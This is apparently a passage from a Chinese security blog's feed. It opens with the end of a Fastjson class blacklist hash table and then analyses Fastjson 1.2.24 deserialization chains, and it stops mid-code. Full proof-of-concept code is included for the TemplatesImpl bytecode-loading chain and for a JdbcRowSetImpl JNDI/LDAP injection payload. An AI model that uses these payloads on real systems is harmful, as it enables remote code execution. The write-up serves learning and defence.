3a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr></tbody></table><p>目前未知的哈希黑名单：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>33238344207745342</td><td>0x761619136cc13eL</td><td></td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td></td></tr><tr><td>1.2.62</td><td>-5472097725414717105</td><td>0xb40f341c746ec94fL</td><td></td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td></td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td></td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td></td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td><td></td></tr></tbody></table><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#0x08-1-2-25-1-2-47%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87">Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby’s Blog (drun1baby.top)</a><br><a href="http://blog.topsec.com.cn/fastjson%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%EF%BC%88%E4%B8%80%EF%BC%89/">Fastjson历史漏洞研究（一） | 天融信阿尔法实验室 (topsec.com.cn)</a><br><a href="https://xz.aliyun.com/t/12728#toc-9">Java反序列化之FastJson反序列化及绕过 - 先知社区 (aliyun.com)</a><br><a href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson1.2.24利用链分析</title>
      <link href="/undefined/17430.html"/>
      <url>/undefined/17430.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>pom.xml依赖如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>其它的和之前没啥差别，jdk用8u65就行，因为会有jndi相关的一些东西</p><h2 id="基于-TemplatesImpl-的利用链"><a href="#基于-TemplatesImpl-的利用链" class="headerlink" title="基于 TemplatesImpl 的利用链"></a>基于 TemplatesImpl 的利用链</h2><p>这条链子网上的文章分析的很多，但是用的却是最少的，fastjson中就是找哪个类下的getter和setter有问题，而这条链传入了一堆根本没有getter和setter的变量，所以就得开启<code>Feature.SupportNonPublicField</code>这个属性反序列化的时候才能解析那些没有getter和setter方法的属性，这样就导致了这条链实用价值并不高</p><h3 id="1-链子分析"><a href="#1-链子分析" class="headerlink" title="1.链子分析"></a>1.链子分析</h3><h4 id="选取能够命令执行的类"><a href="#选取能够命令执行的类" class="headerlink" title="选取能够命令执行的类"></a>选取能够命令执行的类</h4><p>这里直接去到发现漏洞的类，在TemplatesImpl类，这个类也是CC3中利用的加载字节码的类即调用<code>newInstance()</code> 方法触发漏洞，在fastjson中它的一个getter方法里面也调用了即<code>getTransletInstance()</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212125997.png" alt="image-20230821212512323"><br>那这里可能就会出问题，实际上也确实有问题</p><h4 id="TemplatesImpl调用条件分析"><a href="#TemplatesImpl调用条件分析" class="headerlink" title="TemplatesImpl调用条件分析"></a>TemplatesImpl调用条件分析</h4><p>本来想先调试一下再来看的，奈何技术太差不会调，就跟着Drunkbaby佬先看一下 <code>getTransletInstance()</code> 方法，这里其实就和CC3差不多的了，我们需要进入<code>defineTransletClasses()</code>方法里面，那么这里要满足的条件就和CC3一样的了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212125759.png" alt="image-20230821212545549"><br><code>_name</code>不能为空，<code>_class</code>要为空才能进入到<code>defineTransletClasses()</code>方法所以不赋值或者赋值为null都行，接着来到<code>defineTransletClasses()</code>方法，<code>_bytecodes</code>不能为空否则抛异常，接着就是<code>_tfactory</code>不能为空，因为这里会调用到<code>getExternalExtensionsMap()</code>方法为空的话你无法调用并且会报错，这里看一下这个变量发现是<code>transient</code>来修饰的，意味着反序列化无法取到它的值<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212126940.png" alt="image-20230821212603849"><br>不过它一开始就进行了实例化正好为<code>TransformerFactoryImpl</code>类的实例，所以就不需要处理，但是在这里就有个疑问了，这也是前几天Jasper师傅问我的一个问题，我在分析CC3的时候都没注意到这个问题，既然它是由<code>transient</code>来修饰反序列化无法获取到它的值，全靠它自己的初始化，那么exp中为什么又要给它处理一下呢？我记得在CC3中是通过反射给它实例化了一下，带着这个问题继续往下，看看待会能不能搞懂，目前大概的payload就如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java反序列化\\test.class&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Y0n3er&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure><p>但是经过尝试还是不行的，所以继续分析，这里再看一下Fastjson会对setter&#x2F;getter方法进行调用的要求<br>满足条件的setter：</p><ul><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>非静态方法</li><li>无参数</li><li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li></ul><p>而<code>getTransletInstance()</code> 这个方法不满足上述的返回值，如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212126152.png" alt="image-20230821212632069"><br>它获取了实现Translet接口类的实例，所以它返回的是一个抽象类，不满足上述的返回类型，fastjson无法调用到</p><h4 id="解决无法调用-getTransletInstance-方法的问题"><a href="#解决无法调用-getTransletInstance-方法的问题" class="headerlink" title="解决无法调用 getTransletInstance() 方法的问题"></a>解决无法调用 <code>getTransletInstance()</code> 方法的问题</h4><p>那么在这里就像之前找链子一样，find usages找谁调用了<code>getTransletInstance()</code> 方法，发现在同一个类下的<code>newTransformer()</code>方法中调用了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212127692.png" alt="image-20230821212713593"><br>但是<code>newTransformer()</code>不是setter&#x2F;getter方法，无法直接调用，所以继续找谁调用了<code>newTransformer()</code>，然后找到了一个getter方法为<code>getOutputProperties()</code>在这个方法里面调用了<code>newTransformer()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212128528.png" alt="image-20230821212745315"><br>所以这时的链子如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()  ---&gt; newTransformer() ---&gt; TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line"> _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure><p>而且这个 <code>getOutputProperties()</code> 满足 getter 方法里面的返回值，因为返回值是 Properties 即继承自 Map 类型。<br>所以我们现在的 payload 里面需要去管 <code>getOutputProperties()</code> 的 <code>_outputProperties</code> 变量的值，直接赋值为空，因为在前面的调用中会把 <code>_outputProperties</code> 变为 <code>outputProperties</code> ，然后调用这个属性的getter方法即<code>getOutputProperties()</code>这样就连起来了，所以我们的 payload 大概是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java反序列化\\test.class&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Y0n3er&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"> \&quot;_outputProperties\&quot;:&#123; &#125;,</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure><p>其实这样再构造exp就能弹出计算器了，但是这里还是先具体看一下为什么要加上<code>_outputProperties</code> 最终是找到了下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212129248.png"><br>在JavaBeanDeserializer类下的<code>parseField()</code>中调用了<code>smartMatch()</code>方法，跟进这个方法看看，通过这个方法获取到key为<code>_outputProperties</code>然后经过一系列操作将<code>_outputProperties</code>替换为<code>outputProperties</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212131128.png" alt="image-20230821213147513"><br>那么获取到这个属性之后就会去调用这个属性的getter方法，这样就来到了<code>getOutputProperties()</code>方法中，所以不要这个属性是不行的，然后就是之前的那个问题，关于<code>_tfactory</code>这个属性，在fastjson这条链中，这里直接将它设置为<code>&#39;_tfactory&#39;:&#123; &#125;</code>即没有做任何处理，让它自己初始化然后去调用<code>getExternalExtensionsMap()</code>方法，所以这里和CC3中不太一样这个问题就到时候再去看看CC3吧</p><h3 id="2-EXP-构造"><a href="#2-EXP-构造" class="headerlink" title="2. EXP 构造"></a>2. EXP 构造</h3><p>这里payload就是前面的那个，需要注意的是这里在反序列化的时候的参数需要加上 <code>Object.class</code> 加上这个参数后会返回我们反序列化的类，不然就返回的是<code>parseObject</code>当然利用<code>parse</code>来反序列化就不需要，然后还需要加上<code>Feature.SupportNonPublicField</code>这个在前面已经提过了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplPoc</span> &#123;  </span><br><span class="line">    <span class="comment">//readClass用于将恶意类的二进制数据进行base64编码，因为bytesValue()会对_bytecodes的内容进行Base64解码  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java反序列化\\test.class&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +  </span><br><span class="line">                    <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;y0n3er&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>;  </span><br><span class="line">            System.out.println(text1);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  </span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(text1, Feature.SupportNonPublicField);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212132383.png" alt="image-20230821213209083"></p><h2 id="JdbcRowSetImpl-利用链"><a href="#JdbcRowSetImpl-利用链" class="headerlink" title="JdbcRowSetImpl 利用链"></a>JdbcRowSetImpl 利用链</h2><p>这条链子就是平时用的多的一条，利用的是jndi注入</p><h3 id="1-JNDI-LDAP"><a href="#1-JNDI-LDAP" class="headerlink" title="1.JNDI + LDAP"></a>1.JNDI + LDAP</h3><p>直接分析一下流程吧，不知道为什么复现失败了。。。<br>这里直接来到<code>JdbcRowSetImpl</code>这个类下，在<code>connect()</code>方法下可以看到明显的jndi注入<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212133674.png" alt="image-20230821213335448"><br>现在寻找哪里调用了<code>connect()</code>，最终是找到了两个，但是<code>getDatabaseMetaData()</code>返回类型不符合getter调用条件，所以就找到了<code>setAutoCommit()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212133893.png" alt="image-20230821213346258"><br>这里我find uasges是能找到调用但是不知道为什么右边不显示如上图，并且不能直接跳转到源码，不知道是不是因为是class文件的原因，到这里就算结束了，exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPOC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/jhLlcFdL\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里利用的是yakit反连服务作为server，比较方便<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212137308.png" alt="image-20230821213716194"><br>能接收到ldap的请求，但就是弹不出计算器，报错如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212137198.png" alt="image-20230821213725971"><br>设置autoCommit属性错误，不知道命令执行失败是不是因为这个报错，由于复现失败也不想调试分析了，后面又看了看直接跳到了下面这里抛出InvocationTargetException异常，但是不知道怎么解决<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212137289.png" alt="image-20230821213750166"><br>因为打的是jndi注入，所以利用条件一样，也必须要出网。<br>后面又看了看，换了个方式来打，自己起服务不使用yakit，首先生成一个恶意字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 